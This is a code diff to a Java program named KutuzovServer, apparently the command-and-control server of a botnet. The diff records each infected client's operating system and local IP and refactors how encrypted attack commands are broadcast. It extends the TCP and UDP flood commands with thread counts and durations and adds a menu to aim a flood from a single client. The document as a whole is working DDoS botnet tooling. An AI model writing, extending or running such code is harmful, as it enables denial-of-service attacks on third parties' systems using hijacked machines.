@@ -11,6 +11,7 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.util.Locale;
 import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 
@@ -57,6 +58,8 @@ public class KutuzovServer {
                     client.getOutput().writeObject(new SCRequireHandshakePacket());
                     CSHandshakePacket handshakePacket = (CSHandshakePacket)client.getInput().readObject();
                     client.setIdentifierName(handshakePacket.identifierName);
+                    client.setOs(handshakePacket.os);
+                    client.setLocalIp(handshakePacket.localIp);
                 } catch (IOException | ClassNotFoundException e) {
                     pnl("Could not request handshake from client(" + client.getIp() + ")!");
                 }
@@ -89,6 +92,43 @@ public class KutuzovServer {
         menu();
     }
 
+    private void packet_csda_send(String data, Client client) {
+        try {
+            ObjectOutputStream outputStream = client.getOutput();
+            outputStream.writeObject(new SCDAPacket(data));
+
+            ObjectInputStream inputStream = client.getInput();
+            CSDAResPacket resPacket = (CSDAResPacket) inputStream.readObject();
+
+            switch (resPacket.response) {
+                case CSDAResPacket.RESPONSE_OK:
+                    pnl("Sent to " + client.getFormattedIdentifierName());
+                    break;
+                case CSDAResPacket.RESPONSE_ERROR:
+                    pnl("Error sending to " + client.getFormattedIdentifierName());
+                    break;
+                case CSDAResPacket.RESPONSE_BUSY:
+                    pnl(client.getFormattedIdentifierName() + " is busy!");
+                    break;
+            }
+        } catch (Exception e) { pnl("Failed to send data to " + client.getFormattedIdentifierName() + "! (" + e.getMessage() + ")"); }
+    }
+
+    private void packet_csda(String data, Client client) {
+        try {
+            MoodlyEncryption encryption = new MoodlyEncryption();
+            String key = encryption.getKey();
+            String encryptedData = new String(encryption.encrypt(data)) + key;
+
+            if(client == null)
+                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
+                    asyncRun(() -> packet_csda_send(encryptedData, entry.getValue()));
+            else asyncRun(() -> packet_csda_send(encryptedData, client));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
     private void dos_options() {
         clearConsole();
         pnl("DDOS options:");
@@ -109,38 +149,13 @@ public class KutuzovServer {
                 String ip = readLine();
                 pwl(" Port=");
                 int port = Integer.parseInt(readLine());
-                String data = String.format("tcp;%s;%s", ip, port);
+                pwl(" Threads=");
+                int threads = Integer.parseInt(readLine());
+                pwl(" Time(s)=");
+                int time = Integer.parseInt(readLine())*1000;
+                String data = String.format("tcp;%s;%s;%s;%s", ip, port, threads, time);
 
-                try {
-                    MoodlyEncryption encryption = new MoodlyEncryption();
-                    String key = encryption.getKey();
-                    String encryptedData = new String(encryption.encrypt(data)) + key;
-
-                    for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
-                        asyncRun(() -> {
-                            try {
-                                ObjectOutputStream outputStream = entry.getValue().getOutput();
-                                outputStream.writeObject(new SCDAPacket(encryptedData));
-
-                                ObjectInputStream inputStream = entry.getValue().getInput();
-                                CSDAResPacket resPacket = (CSDAResPacket) inputStream.readObject();
-
-                                switch (resPacket.response) {
-                                    case CSDAResPacket.RESPONSE_OK:
-                                        pnl("Sent to " + entry.getKey());
-                                        break;
-                                    case CSDAResPacket.RESPONSE_ERROR:
-                                        pnl("Error sending to " + entry.getKey());
-                                        break;
-                                    case CSDAResPacket.RESPONSE_BUSY:
-                                        pnl(entry.getKey() + " is busy!");
-                                        break;
-                                }
-                            } catch (Exception e) { pnl("Failed to send data to " + entry.getKey() + "! (" + e.getMessage() + ")"); }
-                        });
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+                packet_csda(data, null);
             } break;
             case 2: {
                 clearConsole();
@@ -149,38 +164,13 @@ public class KutuzovServer {
                 String ip = readLine();
                 pwl(" Port=");
                 int port = Integer.parseInt(readLine());
-                String data = String.format("udp;%s;%s", ip, port);
+                pwl(" Threads=");
+                int threads = Integer.parseInt(readLine());
+                pwl(" Time(s)=");
+                int time = Integer.parseInt(readLine())*1000;
+                String data = String.format("udp;%s;%s;%s;%s", ip, port, threads, time);
 
-                try {
-                    MoodlyEncryption encryption = new MoodlyEncryption();
-                    String key = encryption.getKey();
-                    String encryptedData = new String(encryption.encrypt(data)) + key;
-
-                    for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
-                        asyncRun(() -> {
-                            try {
-                                ObjectOutputStream outputStream = entry.getValue().getOutput();
-                                outputStream.writeObject(new SCDAPacket(encryptedData));
-
-                                ObjectInputStream inputStream = entry.getValue().getInput();
-                                CSDAResPacket resPacket = (CSDAResPacket) inputStream.readObject();
-
-                                switch (resPacket.response) {
-                                    case CSDAResPacket.RESPONSE_OK:
-                                        pnl("Sent to " + entry.getKey());
-                                        break;
-                                    case CSDAResPacket.RESPONSE_ERROR:
-                                        pnl("Error sending to " + entry.getKey());
-                                        break;
-                                    case CSDAResPacket.RESPONSE_BUSY:
-                                        pnl(entry.getKey() + " is busy!");
-                                        break;
-                                }
-                            } catch (Exception e) { pnl("Failed to send data to " + entry.getKey() + "! (" + e.getMessage() + ")"); }
-                        });
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+                packet_csda(data, null);
             } break;
             /*case 3: {
 
@@ -192,11 +182,41 @@ public class KutuzovServer {
         }
     }
 
-    private void user_list_client_dos_options() {
+    private void user_list_client_dos_options(Client client) {
         clearConsole();
         pnl("Client DOS options:");
+        pnl("  0) Back");
         pnl("  1) TCP Flood");
         pnl("  2) UDP Flood");
+        pwl("Option: ");
+
+        String input = readLine();
+        int option = input.contentEquals("")?-1:Integer.parseInt(input);
+        clearConsole();
+        switch (option) {
+
+            case 1:
+            case 2: {
+                String protocol = option == 1? "tcp" : "udp";
+                pnl(protocol.toUpperCase(Locale.ROOT) + " Flood attack:");
+                pwl(" IP=");
+                String ip = readLine();
+                pwl(" Port=");
+                int port = Integer.parseInt(readLine());
+                pwl(" Threads=");
+                int threads = Integer.parseInt(readLine());
+                pwl(" Time(s)=");
+                int time = Integer.parseInt(readLine())*1000;
+                String data = String.format(protocol + ";%s;%s;%s;%s", ip, port, threads, time);
+
+                packet_csda(data, client);
+            } break;
+
+            case 0: return;
+            default:
+                user_list_client_dos_options(client);
+                break;
+        }
     }
 
     private void user_list_client(Client client) {
@@ -204,6 +224,7 @@ public class KutuzovServer {
         pnl("ID: " + client.getIdentifierName());
         pnl("IP: " + client.getIp().substring(0, client.getIp().indexOf(':')));
         pnl("OS: " + client.getOs());
+        pnl("LocalIP: " + client.getLocalIp());
         pnl("Options: ");
         pnl("  0) Go back");
         pnl("  1) Send message");
@@ -228,6 +249,10 @@ public class KutuzovServer {
                     pnl("Failed to send message! (" + e.getMessage() + ")");
                     readLine();
                 }
+            } break;
+
+            case 2: {
+                user_list_client_dos_options(client);
             } break;
 
             case 0:
